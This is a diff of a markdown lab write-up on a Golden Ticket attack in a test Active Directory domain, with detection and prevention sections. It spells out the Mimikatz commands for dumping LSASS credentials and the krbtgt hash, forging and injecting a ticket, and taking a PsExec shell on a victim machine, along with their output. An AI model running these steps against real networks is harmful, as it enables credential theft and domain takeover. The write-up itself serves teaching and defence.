@@ -1,77 +1,109 @@
 # Golden Ticket Generation
 
-**Date:** June 2026  
-**Author:** ShahinSecLab  
-**Category:** Persistence  
-**Difficulty:** Easy  
+**Date:** June 2026 <br>
+**Author:** ShahinSecLab <br>
+**Category:** Persistence <br>
+**Difficulty:** Easy <br>
 **Tools:** Mimikatz, PSExec, Evil-WinRM
 
-## Table of Contents
+## Table of Contents 
 
-- [What is a Golden Ticket?](#what-is-a-golden-ticket)
-- [Why This Attack is Dangerous](#why-this-attack-is-dangerous)
-- [Prerequisites](#prerequisites)
-- [What I Understood During the Process](#what-i-understood-during-the-process)
-- [Step 1 — Downloading Mimikatz in Kali](#step-1--downloading-mimikatz-in-kali)
-- [Step 2 — Running Mimikatz on the DC](#step-2--running-mimikatz-on-the-dc)
-- [Step 3 — Dumping Credentials from Memory](#step-3--dumping-credentials-from-memory)
-- [Step 4 — Dumping the krbtgt Hash](#step-4--dumping-the-krbtgt-hash)
-- [Step 5 — Generating and Injecting the Golden Ticket](#step-5--generating-and-injecting-the-golden-ticket)
-- [Step 6 — Opening a CMD Shell with the Golden Ticket](#step-6--opening-a-cmd-shell-with-the-golden-ticket)
-- [Step 7 — Accessing Victim Machine File System](#step-7--accessing-victim-machine-file-system)
-- [Step 8 — Getting a Shell on the Victim Machine](#step-8--getting-a-shell-on-the-victim-machine)
-- [Mitigations](#mitigations)
-- [Key Takeaways](#key-takeaways)
-- [References](#references)
+* [Introduction](#introduction)
+* [Attack Flow](#attack-flow)
+* [Why This Attack Works](#why-this-attack-works)
+* [Lab Setup](#lab-setup)
+* [Tools Used](#tools-used)
+* [Prerequisites](#prerequisites)
+* [What I Understood During the Process](#what-i-understood-during-the-process)
+* [Step 1 — Downloading Mimikatz in Kali](#step-1--downloading-mimikatz-in-kali)
+* [Step 2 — Running Mimikatz on the DC](#step-2--running-mimikatz-on-the-dc)
+* [Step 3 — Dumping Credentials from Memory](#step-3--dumping-credentials-from-memory)
+* [Step 4 — Dumping the krbtgt Hash](#step-4--dumping-the-krbtgt-hash)
+* [Step 5 — Generating and Injecting the Golden Ticket](#step-5--generating-and-injecting-the-golden-ticket)
+* [Step 6 — Opening a CMD Shell with the Golden Ticket](#step-6--opening-a-cmd-shell-with-the-golden-ticket)
+* [Step 7 — Accessing Victim Machine File System](#step-7--accessing-victim-machine-file-system)
+* [Step 8 — Getting a Shell on the Victim Machine](#step-8--getting-a-shell-on-the-victim-machine)
+* [How Defenders Can Catch This](#how-defenders-can-catch-this)
+* [How to Prevent It](#how-to-prevent-it)
+* [References](#references)
+* [Lessons Learned](#lessons-learned)
 
-## What is a Golden Ticket?
+## Introduction
 
-A Golden Ticket is basically a fake login pass. Once you have it, you can get into anything on the network — and it doesn't expire unless someone resets the right password twice.
-The whole thing comes down to one account called krbtgt. Think of it as the gatekeeper of the entire domain — every login request in Active Directory goes through it. If you grab its password hash, you can create your own fake tickets and walk around the network as anyone you want, even the Domain Admin, without ever actually logging into that account.
+A Golden Ticket is a fake Kerberos ticket that lets an attacker log in to an Active Directory domain without knowing a real user's password. With this ticket, the attacker can access domain resources as any user, including the Domain Administrator.
 
-## Why This Attack is Dangerous
+This attack depends on the `krbtgt` account. The `krbtgt` account is used by the Domain Controller to create and verify Kerberos tickets. If an attacker gets the `krbtgt` NTLM hash, they can create their own Kerberos tickets and use them to access other machines in the domain.
 
-- Even if the real user changes their password, the forged ticket still works fine
-- It skips the normal login process entirely — no credentials needed
-- By default it stays valid for 10 years, so it's not going anywhere
-- Since it looks exactly like a real Kerberos ticket, most systems won't even flag it
-- Resetting the Administrator password does nothing — the only way to kill it is by resetting the krbtgt password twice
+A Golden Ticket can stay valid for a long time, depending on how it is created. The only way to completely stop it is to reset the `krbtgt` password twice.
+
+## Attack Flow
+```
+Gain Domain Admin Access
+          ↓
+Run Mimikatz on the Domain Controller
+          ↓
+Enable Debug Privilege
+          ↓
+Dump the Domain SID and krbtgt NTLM Hash
+          ↓
+Create a Golden Ticket
+          ↓
+Inject the Golden Ticket into Memory
+          ↓
+Open a New CMD Session
+          ↓
+Use the Golden Ticket to Access Another Domain Machine
+          ↓
+Access the Remote C$ Administrative Share
+          ↓
+Use PSExec to Get a Remote CMD Shell
+          ↓
+Take Full Control of the Target Machine
+```
+## Why This Attack Works
+
+This attack works because Kerberos accepts Ticket Granting Tickets (TGTs) that are signed with the `krbtgt` account. If an attacker gets the `krbtgt` NTLM hash, they can create their own Kerberos tickets.
+
+Since the forged ticket is signed with the correct `krbtgt` hash, the Domain Controller accepts it as a valid ticket. This allows the attacker to access domain resources as almost any user without knowing that user's password.
+
+## Lab Setup
+
+| Component            | Value               |
+| -------------------- | ------------------- |
+| Attacker Machine     | Kali Linux          |
+| Domain Controller    | Windows Server 2022 |
+| Victim Machine       | Windows 10          |
+| Domain               | `readteambd.local`  |
+| Domain Admin Account | `Administrator`     |
+
+## Tools Used
+
+| Tool       | Purpose                                                  |
+| ---------- | -------------------------------------------------------- |
+| `Mimikatz`   | Dump the `krbtgt` NTLM hash and create the Golden Ticket |
+| `PSExec`     | Execute commands and get a remote CMD shell              |
+| `Evil-WinRM` | Connect to Windows systems over WinRM                    |
 
 ## Prerequisites
 
-To perform this attack, I needed the following prerequisites:
-
-```
-| Requirement         |                                      Why It Was Needed                               |
-|---------------------|--------------------------------------------------------------------------------------|
-| Domain Admin Access | Required to run Mimikatz on the Domain Controller and extract sensitive information. |
-| `krbtgt` NTLM Hash  | Used to forge a valid Kerberos Ticket Granting Ticket (Golden Ticket).               |
-| Domain SID          | Required when constructing the forged Kerberos ticket.                               |
-| Domain Name         | Required when generating the Golden Ticket.                                          |
-```
-
-## What I Understood During the Process
-
-While working through this attack I realized that:
-
-- The krbtgt account is the most sensitive account in any Active Directory domain
-- Whoever controls its hash essentially controls the entire domain
-- Golden Tickets do not need network access to generate — everything is done locally
-- Detection is difficult because the ticket looks completely legitimate to the DC
-
+| What          | Why                                           |
+| ------------------- | ------------------------------------------------- |
+| Domain Admin Access | Required to run Mimikatz on the Domain Controller |
+| `krbtgt` NTLM Hash  | Required to create a Golden Ticket                |
+| Domain SID          | Required to generate the Golden Ticket            |
+| Domain Name         | Required when creating the ticket                 |
 
 ## Step 1 — Downloading Mimikatz in Kali
 
-First I downloaded mimikatz_trunk.zip from GitHub on my Kali machine, then transferred it to the Domain Controller. After that I unzipped it on the DC.
+First I downloaded `mimikatz_trunk.zip` from GitHub on my Kali machine, then transferred it to the Domain Controller. After that I unzipped it on the DC.
 
 ## Step 2 — Running Mimikatz on the DC
 
-After that I opened CMD on the DC. Since mimikatz.exe was sitting in my Downloads folder, I navigated to that directory and ran it from there.
+After that I opened CMD on the DC. Since `mimikatz.exe` was sitting in my Downloads folder, I navigated to that directory and ran it from there.
 
 ```bash
 C:\Users\Administrator\Downloads>mimikatz.exe
 ```
-
 **Output:**
 
 ```text
@@ -84,7 +116,6 @@ C:\Users\Administrator\Downloads>mimikatz.exe
 
   mimikatz #
   ```
-
 ### Enable Debug Privilege
 
 ```bash
@@ -111,9 +142,8 @@ When log into Windows, LSASS:
 Now I need Domain SID and krbtgt NTLM Hash.
 
 ```bash
-sekurlsa::logonpasswords
+mimikatz # sekurlsa::logonpasswords
 ```
-
 This command tells Mimikatz to dig into LSASS process memory and pull out all the credentials Windows is storing there.
 Mimikatz reaches into that memory and pulls everything out.
 
@@ -154,15 +184,13 @@ Got the Administrator NTLM hash sitting right in memory. No cracking needed — 
 ```bash
 mimikatz # lsadump::lsa /inject /name:krbtgt
 ```
+**Flag Breakdown**
 
-### Flag Breakdown
-```
 | Flag           | Description                                               |
 |----------------|-----------------------------------------------------------|
 | `lsadump::lsa` | Dumps credentials from the LSA (Local Security Authority) |
 | `/inject`      | Injects into the LSASS process to extract data            |
 | `/name:krbtgt` | Targets specifically the `krbtgt` account                 |
-```
 
 Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes after one specific account — `krbtgt`. This is the account I need to forge a Golden Ticket. It gives me the NTLM hash and the domain SID in one shot.
 
@@ -176,7 +204,7 @@ Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes af
 kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745015721-426968701-4006811760 /krbtgt:5f8156b8f557baae7cd069ac724e1959 /id:500 /ptt
 ```
 
-### Flag Breakdown
+**Flag Breakdown**
 
 | Flag | Value | Description |
 |------|-------|-------------|
@@ -228,15 +256,17 @@ After injecting the Golden Ticket with `/ptt`, I ran `misc::cmd` to open a new C
 dir \\192.168.5.142\c$
 ```
 
-### What This Does
+**Flag Breakdown**
 
-| Part | Description |
+| Flag | Description |
 |------|-------------|
 | `dir` | Lists files and folders |
 | `\\192.168.5.142` | IP address of the target victim machine |
 | `\c$` | The C drive admin share — only accessible to Domain Admins |
 
-```text
+**Output:**
+
+```
  Volume in drive \\192.168.5.142\C$ has no label.
  Volume Serial Number is D040-B181
 
@@ -255,7 +285,7 @@ dir \\192.168.5.142\c$
   <img src="/Active-Directory/08-golden ticket/images/step7.png" width="600">
 </p>
 
-### What This Proves
+**What This Proves**
 
 If this command returns the contents of the C drive, it means the Golden Ticket worked. I am accessing another machine in the domain as Domain Administrator — without ever using a real password. Just the forged ticket was enough to get in.
 
@@ -265,9 +295,9 @@ If this command returns the contents of the C drive, it means the Golden Ticket 
 psexec \\192.168.5.142 cmd.exe
 ```
 
-### Flag Breakdown
+**Flag Breakdown**
 
-| Part | Description |
+| Flag | Description |
 |------|-------------|
 | `psexec` | Sysinternals tool that runs commands remotely on other machines |
 | `\\192.168.5.142` | IP address of the target victim machine |
@@ -277,6 +307,7 @@ psexec \\192.168.5.142 cmd.exe
 After the Golden Ticket was loaded into my session, I used PSExec to get a full interactive CMD shell on the victim machine at `192.168.5.142` — no password, no credentials, just the forged ticket doing all the work.
 
 **Output:**
+
 ```
 PsExec v2.2 - Execute processes remotely
 Copyright (C) 2001-2016 Mark Russinovich
@@ -305,50 +336,52 @@ Complete control over the victim machine
 
 This is the final proof that the Golden Ticket attack worked from end to end — I moved from the Domain Controller all the way into a victim machine using nothing but a forged Kerberos ticket.
 
-## Mitigations
+## How Defenders Can Catch This
 
-- Protect the krbtgt Accoun
-- Harden Domain Admin Access
-- Protect LSASS from Mimikat
-- Detection and Monitoring
-- Enforce AES over RC4
-- Limit Lateral Movement
+| Indicator                      | What to Look For                                               |
+| ------------------------------ | -------------------------------------------------------------- |
+| Long lifetime Kerberos tickets | Tickets that are valid for an unusual amount of time           |
+| Event ID 4768                  | Suspicious TGT requests                                        |
+| Event ID 4769                  | Unusual Kerberos service ticket requests                       |
+| Event ID 4624                  | Login activity from unknown or unusual systems                 |
+| LSASS access                   | Unknown programs trying to read LSASS memory                   |
+| Mimikatz usage                 | Execution of credential dumping tools on the Domain Controller |
+| Multiple system access         | One account accessing many machines quickly                    |
+| Admin share access             | Unexpected access to `C$` or `ADMIN$` shares                   |
 
-## Key Takeaways
+## How to Prevent It
 
-| # | Takeaway |
-|---|----------|
-| 1 | `krbtgt` is the most sensitive account in any Active Directory domain. Protecting it is not optional. |
-| 2 | Resetting the Administrator password after this attack does absolutely nothing. The ticket does not use the user's password at all. |
-| 3 | Forged tickets look completely normal to the Domain Controller. You cannot tell the difference by looking at the ticket alone — you have to look at patterns and anomalies. |
-| 4 | Domain Admin access is the prerequisite. If an attacker never gets there, there is no Golden Ticket. Initial access hardening is where this fight is won or lost. |
-| 5 | A ticket can sit in memory for 10 years. Incident response must include double `krbtgt` rotation — not as optional cleanup but as the mandatory first step. |
-| 6 | Credential Guard is the strongest single technical control here. If LSASS memory is not readable, the hash cannot be stolen. |
-| 7 | RC4 enforcement of AES is not just a performance preference — it is a meaningful detection and prevention layer against the most common Golden Ticket tooling. |
-
+* Protect the `krbtgt` account because it is used to create Kerberos tickets.
+* Reset the `krbtgt` password twice after a Golden Ticket attack.
+* Do not give Domain Admin access to unnecessary users.
+* Enable Credential Guard to protect credentials stored in memory.
+* Keep Domain Controllers updated.
+* Monitor Kerberos login activity.
+* Use strong passwords for administrator accounts.
+* Remove unused privileged accounts.
+* Limit access between systems to reduce lateral movement.
 
 ## References
 
-### Microsoft Official Docs
+| Resource                                                 | Link                                                                                                                                 |
+| -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| Kerberos Authentication Overview                         | https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview                                  |
+| Credential Guard                                         | https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard                             |
+| Protected Users Security Group                           | https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group       |
+| New-KrbtgtKeys.ps1                                       | https://github.com/microsoft/New-KrbtgtKeys.ps1                                                                                      |
+| Kerberos krbtgt Password Reset                           | https://techcommunity.microsoft.com/t5/microsoft-security-baselines/kerberos-krbtgt-password-reset-scripts-now-available/ba-p/247381 |
+| Golden Ticket - MITRE ATT&CK T1558.001                   | https://attack.mitre.org/techniques/T1558/001/                                                                                       |
+| LSASS Memory Credential Dumping - MITRE ATT&CK T1003.001 | https://attack.mitre.org/techniques/T1003/001/                                                                                       |
+| Mimikatz                                                 | https://github.com/gentilkiwi/mimikatz                                                                                               |
+| PsExec                                                   | https://learn.microsoft.com/en-us/sysinternals/downloads/psexec                                                                      |
+| Evil-WinRM                                               | https://github.com/Hackplayers/evil-winrm                                                                                            |
 
-- [Kerberos Authentication Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
-- [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)
-- [Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
-- [New-KrbtgtKeys.ps1 — Official Reset Script](https://github.com/microsoft/New-KrbtgtKeys.ps1)
-- [Kerberos krbtgt Password Reset — Microsoft Security Blog](https://techcommunity.microsoft.com/t5/microsoft-security-baselines/kerberos-krbtgt-password-reset-scripts-now-available/ba-p/247381)
+## Lessons Learned
 
-### MITRE ATT&CK
-
-- [T1558.001 — Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
-- [T1003.001 — LSASS Memory Credential Dumping](https://attack.mitre.org/techniques/T1003/001/)
-
-### Tools Referenced in the Writeup
-
-- [Mimikatz by gentilkiwi](https://github.com/gentilkiwi/mimikatz)
-- [Sysinternals PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
-- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
-
-### Further Reading
-
-- [Sean Metcalf — Golden Ticket Attacks & Defenses (ADSecurity.org)](https://adsecurity.org/?p=1640)
-- [SANS — Kerberos Attacks: Golden Tickets, Silver Tickets & More](https://www.sans.org/blog/kerberos-in-the-crosshairs-golden-tickets-silver-tickets-mitm-more/)
+* The `krbtgt` account is the most important account for Kerberos authentication.
+* If an attacker gets the `krbtgt` hash, they can create their own Golden Ticket.
+* A Golden Ticket allows access without using a real password.
+* Changing the Administrator password does not remove a Golden Ticket.
+* The `krbtgt` password must be changed twice to remove existing tickets.
+* Protecting the Domain Controller is very important because it stores sensitive Active Directory information.
+* Proper monitoring can help find suspicious Kerberos activity.
